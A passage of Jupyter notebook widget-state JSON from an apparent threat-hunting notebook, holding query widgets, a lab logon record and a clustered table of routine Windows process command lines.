        "IPY_MODEL_4be552417ab64dcc9bf5918a78b69330",
        "IPY_MODEL_03ffb5657f8d47a2809b6c77845ea134",
        "IPY_MODEL_6c2ed05634d847d0a503b9ce585e3ba5"
       ],
       "layout": "IPY_MODEL_b787143d983747c2a9f411d9178a4907"
      }
     },
     "9d7c6026399e44aabbe9c1c3ec7b2ca7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "SelectMultipleModel",
      "state": {
       "_options_labels": [
        "127.0.0.1",
        "microsoft.com",
        "www.401hk.com"
       ],
       "description": "Source: ",
       "index": [],
       "layout": "IPY_MODEL_192c9ef6fca64b9184c07e7f8fa1a52e",
       "rows": 5,
       "style": "IPY_MODEL_046874da90664fa48459ae8bd3afbfcb"
      }
     },
     "9ecff56fd03a491e8f2a795d7152753c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DatePickerModel",
      "state": {
       "description": "Origin Date",
       "disabled": false,
       "layout": "IPY_MODEL_b14d7bb4a0704e9cb530d4dd9cd27a4f",
       "style": "IPY_MODEL_a2e285a9c2a04acbbe32dedffe873342",
       "value": {
        "date": 9,
        "month": 1,
        "year": 2019
       }
      }
     },
     "9f14a2f1c8e54274b12f3529191bc92b": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "50%"
      }
     },
     "9f35693cb9b644ab967d4acdee79ec61": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "a17fefc8f73140c5bf292064a7b210e5": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "a2e285a9c2a04acbbe32dedffe873342": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "a4275b4ea3864336b2937d274429cc50": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "a559dc7951274d73a93155fedf0a59d2": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "a70ac58c1bb040c9994e543afd598800": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_0f5cf9eee0ad4666b5dbd9bacc29a50d",
        "IPY_MODEL_662f3c7fd3444eed97ecad9b895c8c1a",
        "IPY_MODEL_23e15a1a6712477c80955ca73178b1c1"
       ],
       "layout": "IPY_MODEL_ed98e6cc150540db8684fb76ba12357b"
      }
     },
     "a80dcf8eb79c4d7ba7c25c41b370a0a8": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "aadad8f762a949aca8b87333a7088524": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add ⇾",
       "layout": "IPY_MODEL_dcac7a84f3554c558d3aebdfebaf835e",
       "style": "IPY_MODEL_30ff1bc49ff1437ea7d15558312b2e33"
      }
     },
     "aca93f8ef4e04983ac164ae74396e846": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "aceeb747da3e4c15b17475be45580eda": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "acfd6071b9c04c5aa04284268385fbfa": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_dd6a9a470f2b440f956956be7833abab",
        "IPY_MODEL_d181ae50519d459a8677d7cefa540ac7",
        "IPY_MODEL_ae8752f7e2ec4687914a08159e032c1f"
       ],
       "layout": "IPY_MODEL_43b3016d401048c890fed15c30347c6f"
      }
     },
     "ae8752f7e2ec4687914a08159e032c1f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_cbc5a13b749c4dffb462ad816e358692",
       "style": "IPY_MODEL_058befd71b5448408ab5800bad67fb51",
       "value": "2019-02-19 19:04:00.244055"
      }
     },
     "af96783e914c45c08ac489c564b63b07": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add All ⇾",
       "layout": "IPY_MODEL_0b99053b4f1d481188bbab10bc820a30",
       "style": "IPY_MODEL_9b9b76920d534c35a5c5e72e8c646567"
      }
     },
     "b068cb4a09d04ca7aeac14bcd48121fb": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "b14d7bb4a0704e9cb530d4dd9cd27a4f": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b183a63f471a475aae2f01235c6cc496": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "width": "80%"
      }
     },
     "b275c0ae8f874aeb9bf37f2c00d275e7": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "b289892730c149249abba2c415b26d96": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b787143d983747c2a9f411d9178a4907": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "b7fa34a6681c42dd95ab16f4781b3ca7": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "ba21ff619b5f4548817d30a290f8fb97": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "border": "1px solid black"
      }
     },
     "bb0184404977459fa59995f17211cc71": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "bb090c535e6c4dfabcb311e38afdde43": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "bb5f07f4251b4ad2b36b2198def0ce3c": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "TextModel",
      "state": {
       "description": "Query end time (UTC) :  ",
       "layout": "IPY_MODEL_44676d6ac96d40d5873a57c074df2cd4",
       "style": "IPY_MODEL_ee60d32c9ce348a9b683e095d2dee8cd",
       "value": "2019-02-15 13:32:50.220000"
      }
     },
     "bbf4a02ee4c54ae2b51c1eeb387ac2dd": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonStyleModel",
      "state": {}
     },
     "bc0b65dbca824d3b9d238c61541da94e": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "bc3d246f758f41b280561480b56f0280": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "ButtonModel",
      "state": {
       "description": "Add All ⇾",
       "layout": "IPY_MODEL_0be0e5fba26e4019b1ab1860d38f70ea",
       "style": "IPY_MODEL_b068cb4a09d04ca7aeac14bcd48121fb"
      }
     },
     "bcf27e2a10af47bebdce4ab18d065bf0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_91cdff723330465fa16da6c9271e4430",
        "IPY_MODEL_cc3e785ac6ef41debee641a88bbad8da",
        "IPY_MODEL_24f10def54ec4b11b5a250087559845b"
       ],
       "layout": "IPY_MODEL_7b9520e510c646c0a8eb672332dda8da"
      }
     },
     "bfb8a488cfc44d1ca3b4b1bf822174a0": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "bfdfaa5bef0b48e892e846a85ff8b777": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": "initial"
      }
     },
     "c00acfe125f743ab8210567f9140a26f": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "VBoxModel",
      "state": {
       "children": [
        "IPY_MODEL_bc3d246f758f41b280561480b56f0280",
        "IPY_MODEL_40fefc7d4b4f4cefa9aa4cb58bdd7f99",
        "IPY_MODEL_e74808a8d33f444887f07fa8926bfaae",
        "IPY_MODEL_27142b0811454656ae1639b31ee89b36"
       ],
       "layout": "IPY_MODEL_c0ab04053cbc4e09b307df561b2dedca"
      }
     },
     "c0ab04053cbc4e09b307df561b2dedca": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c1a07bf17c42455d9c0666f71486e40e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c3c892a34ca840ab8bafdde96dda90d0": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c4720d1af0394739bac70fe918b16b8e": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "c4af651261194be48080b1095dd612d8": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {
       "height": "300px",
       "width": "100%"
      }
     },
     "c5fe0ac9e5c5445c9205e622260c2eba": {
      "model_module": "@jupyter-widgets/controls",
      "model_module_version": "1.5.0",
      "model_name": "DescriptionStyleModel",
      "state": {
       "description_width": ""
      }
     },
     "c7cb1e92c6094286a6a8da5f78c0ab11": {
      "model_module": "@jupyter-widgets/base",
      "model_module_version": "1.2.0",
      "model_name": "LayoutModel",
      "state": {}
     },
     "caf32adbbaa64ac0a0b4b10ed4d1b325": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_ba21ff619b5f4548817d30a290f8fb97",
       "outputs": [
        {
         "name": "stdout",
         "output_type": "stream",
         "text": "### Account Logon\nAccount:  ian\nAccount Domain:  MSTICAlertsWin1\nLogon Time:  2019-02-13 00:55:38.670000\nLogon type: 3  (Network)\nUser Id/SID:  S-1-5-21-996632719-2361334927-4038480536-1120\n    SID S-1-5-21-996632719-2361334927-4038480536-1120 is local machine or domain account\nSession id '0x15a1d83'  \nSubject (source) account:  -/-\nLogon process:  NtLmSsp \nAuthentication:  NTLM\nSource IpAddress:  10.0.3.4\nSource Host:  MSTICALERTSLXVM2\nLogon status:  \n\n"
        }
       ]
      }
     },
     "cb950670b77c4bccbe5d0959b8d9a705": {
      "model_module": "@jupyter-widgets/output",
      "model_module_version": "1.0.0",
      "model_name": "OutputModel",
      "state": {
       "layout": "IPY_MODEL_30d2b76767f3411b9e59d057a1ce2abe",
       "outputs": [
        {
         "data": {
          "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>NewProcessName</th>\n      <th>CommandLine</th>\n      <th>SubjectLogonId</th>\n      <th>ClusterSize</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>C:\\WindowsAzure\\GuestAgent_2.7.41491.901_2019-01-14_202614\\CollectGuestLogs.exe</td>\n      <td>\"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\710dc858-9c96-4df...</td>\n      <td>0x3e7</td>\n      <td>128</td>\n    </tr>\n    <tr>\n      <th>40</th>\n      <td>C:\\WindowsAzure\\GuestAgent_2.7.41491.901_2019-01-14_202614\\CollectGuestLogs.exe</td>\n      <td>\"CollectGuestLogs.exe\" -Mode:ga -FileName:C:\\WindowsAzure\\CollectGuestLogsTemp\\7a9d40f2-490e-446...</td>\n      <td>0x3e7</td>\n      <td>128</td>\n    </tr>\n    <tr>\n      <th>128</th>\n      <td>C:\\Windows\\System32\\conhost.exe</td>\n      <td>\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1</td>\n      <td>0x3e7</td>\n      <td>5559</td>\n    </tr>\n    <tr>\n      <th>5687</th>\n      <td>C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF\\DesiredStateCon...</td>\n      <td>\"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF/DesiredStateCo...</td>\n      <td>0x3e7</td>\n      <td>162</td>\n    </tr>\n    <tr>\n      <th>10729</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /ua /installsource scheduler</td>\n      <td>0x3e7</td>\n      <td>137</td>\n    </tr>\n    <tr>\n      <th>10866</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>C:\\Windows\\System32\\cmd.exe /c c:\\diagnostics\\WinBenignActivity.cmd 1 200</td>\n      <td>0x3e7</td>\n      <td>30</td>\n    </tr>\n    <tr>\n      <th>12530</th>\n      <td>C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF-64\\DesiredState...</td>\n      <td>\"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\ICT 2\\CMF-64/DesiredStat...</td>\n      <td>0x3e7</td>\n      <td>98</td>\n    </tr>\n    <tr>\n      <th>12655</th>\n      <td>C:\\Windows\\System32\\sppsvc.exe</td>\n      <td>C:\\Windows\\system32\\sppsvc.exe</td>\n      <td>0x3e7</td>\n      <td>143</td>\n    </tr>\n    <tr>\n      <th>12798</th>\n      <td>C:\\Windows\\System32\\wbem\\WmiPrvSE.exe</td>\n      <td>C:\\Windows\\system32\\wbem\\wmiprvse.exe -Embedding</td>\n      <td>0x3e7</td>\n      <td>224</td>\n    </tr>\n    <tr>\n      <th>13958</th>\n      <td>C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\Resources\\884\\pmfexe.exe</td>\n      <td>\"C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\Health Service State\\Resources\\884\\pmfexe.exe...</td>\n      <td>0x3e7</td>\n      <td>70</td>\n    </tr>\n    <tr>\n      <th>14222</th>\n      <td>C:\\Windows\\System32\\cmd.exe</td>\n      <td>\"cmd\"</td>\n      <td>0x3e7</td>\n      <td>120</td>\n    </tr>\n    <tr>\n      <th>14342</th>\n      <td>C:\\Windows\\System32\\UsoClient.exe</td>\n      <td>C:\\Windows\\system32\\usoclient.exe RefreshSettings</td>\n      <td>0x3e7</td>\n      <td>14</td>\n    </tr>\n    <tr>\n      <th>14343</th>\n      <td>C:\\Windows\\System32\\UsoClient.exe</td>\n      <td>C:\\Windows\\system32\\usoclient.exe StartScan</td>\n      <td>0x3e7</td>\n      <td>14</td>\n    </tr>\n    <tr>\n      <th>14352</th>\n      <td>C:\\Windows\\System32\\UsoClient.exe</td>\n      <td>C:\\Windows\\system32\\usoclient.exe StartInstall</td>\n      <td>0x3e7</td>\n      <td>14</td>\n    </tr>\n    <tr>\n      <th>14356</th>\n      <td>C:\\Windows\\System32\\wermgr.exe</td>\n      <td>C:\\Windows\\system32\\wermgr.exe -upload</td>\n      <td>0x3e7</td>\n      <td>40</td>\n    </tr>\n    <tr>\n      <th>14500</th>\n      <td>C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe</td>\n      <td>\"C:\\WindowsAzure\\SecAgent\\WaSecAgentProv.exe\" -startPoll C:\\WindowsAzure\\Logs\\ 168.63.129.16 524...</td>\n      <td>0x3e7</td>\n      <td>26</td>\n    </tr>\n    <tr>\n      <th>14526</th>\n      <td>C:\\Windows\\System32\\taskhostw.exe</td>\n      <td>taskhostw.exe</td>\n      <td>0x3e7</td>\n      <td>40</td>\n    </tr>\n    <tr>\n      <th>14566</th>\n      <td>C:\\Windows\\System32\\InstallAgent.exe</td>\n      <td>C:\\Windows\\System32\\InstallAgent.exe -Embedding</td>\n      <td>0x3e7</td>\n      <td>21</td>\n    </tr>\n    <tr>\n      <th>14587</th>\n      <td>C:\\Windows\\System32\\wsqmcons.exe</td>\n      <td>C:\\Windows\\System32\\wsqmcons.exe</td>\n      <td>0x3e7</td>\n      <td>26</td>\n    </tr>\n    <tr>\n      <th>14613</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /svc</td>\n      <td>0x3e7</td>\n      <td>43</td>\n    </tr>\n    <tr>\n      <th>14617</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /c</td>\n      <td>0x3e7</td>\n      <td>43</td>\n    </tr>\n    <tr>\n      <th>14618</th>\n      <td>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe</td>\n      <td>\"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe\" /cr</td>\n      <td>0x3e7</td>\n      <td>43</td>\n    </tr>\n    <tr>\n      <th>14656</th>\n      <td>C:\\Windows\\System32\\CompatTelRunner.exe</td>\n      <td>C:\\Windows\\system32\\compattelrunner.exe</td>\n      <td>0x3e7</td>\n      <td>8</td>\n    </tr>\n    <tr>\n      <th>14664</th>\n      <td>C:\\Windows\\System32\\DeviceCensus.exe</td>\n      <td>C:\\Windows\\system32\\devicecensus.exe</td>\n      <td>0x3e7</td>\n      <td>6</td>\n    </tr>\n    <tr>\n      <th>14670</th>\n      <td>C:\\Windows\\System32\\DeviceCensus.exe</td>\n      <td>C:\\Windows\\system32\\devicecensus.exe UserCxt</td>\n      <td>0x3e7</td>\n      <td>6</td>\n    </tr>\n    <tr>\n      <th>14693</th>\n      <td>C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.1812.3-0\\MpCmdRun.exe</td>\n      <td>\"C:\\ProgramData\\Microsoft\\Windows Defender\\platform\\4.18.1812.3-0\\MpCmdRun.exe\" Scan -ScheduleJo...</td>\n      <td>0x3e7</td>\n      <td>4</td>\n    </tr>\n    <tr>\n      <th>14697</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k wsappx</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14699</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k NetworkService</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14700</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k defragsvc</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14701</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k LocalServiceAndNoImpersonation</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14702</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k appmodel</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14703</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k smbsvcs</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14704</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k DcomLaunch</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14705</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k RPCSS</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14706</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k NetworkService</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14707</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k LocalServiceNetworkRestricted</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14708</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k termsvcs</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14709</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k LocalServiceNoNetwork</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14710</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k LocalServiceNetworkRestricted</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14711</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k LocalSystemNetworkRestricted</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14712</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k ICService</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14713</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k netsvcs</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14714</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k LocalService</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14716</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k WbioSvcGroup</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14717</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k apphost</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14718</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k utcsvc</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14719</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k ftpsvc</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14720</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\System32\\svchost.exe -k LPDService</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14721</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k iissvcs</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>14722</th>\n      <td>C:\\Windows\\System32\\svchost.exe</td>\n      <td>C:\\Windows\\system32\\svchost.exe -k UnistackSvcGroup</td>\n      <td>0x3e7</td>\n      <td>69</td>\n    </tr>\n    <tr>\n      <th>...</th>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n      <td>...</td>\n    </tr>\n    <tr>\n      <th>22279</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent ac4 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22280</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent a44 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22281</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 774 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22282</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 768 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22283</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent aa0 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22284</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent ac8 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22285</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 768 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22286</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent a78 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22287</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent b6c -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22288</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent ac8 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22289</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 754 -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22290</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent 73c -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22291</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe -StartupEvent b6c -InterruptEvent 0...</td>\n      <td>0x3e7</td>\n      <td>768</td>\n    </tr>\n    <tr>\n      <th>22292</th>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe</td>\n      <td>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\mscorsvw.exe 